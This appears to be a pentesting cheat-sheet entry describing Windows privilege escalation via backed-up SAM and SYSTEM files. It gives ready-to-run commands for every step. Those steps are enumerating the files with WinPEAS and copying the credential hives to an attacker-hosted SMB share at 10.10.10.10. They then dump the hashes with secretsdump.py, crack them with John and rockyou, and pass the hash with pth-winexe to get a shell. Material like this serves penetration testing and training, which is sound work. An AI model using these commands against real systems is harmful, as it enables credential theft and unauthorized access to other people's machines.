Sometimes sysadmins take backup of SAM and SYSTEM file and keep it in a insecure folder which can be used by an Attacker.
We can use WinPEAS to enumerate the backed-up SAM and SYSTEM files.

Copy both files on attacker machine:

We can use smbserver.py script by impacket to host an SMB server:

-- smbserver.py <ShareName> <Directory Path to Host>

-- EG:- On Attacker machine :-  smbserver.py l3v1ath0n /home/l3v1ath0n/

-- On Windows :- copy C:\Windows\Repair\SAM \\10.10.10.10\l3v1ath0n\
-- On Windows :- copy C:\Windows\Repair\SYSTEM \\10.10.10.10\l3v1ath0n\

After uploading these files we will use secretsdump.py script to fetch the SAM file's content.

-- secretsdump.py -sam /home/l3v1ath0n/SAM -system /home/l3v1ath0n/SYSTEM LOCAL <If LOCAL didn't mentioned then provide IP for host.>

After getting the hashes in LM and NTLM form we can use John or Hashcat to crack these hashes with following command.

-- john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\

Or we can use the hashes to pass it and perform pass the hash:

pth-winexe -U 'admin%hashes' //IP cmd.exe
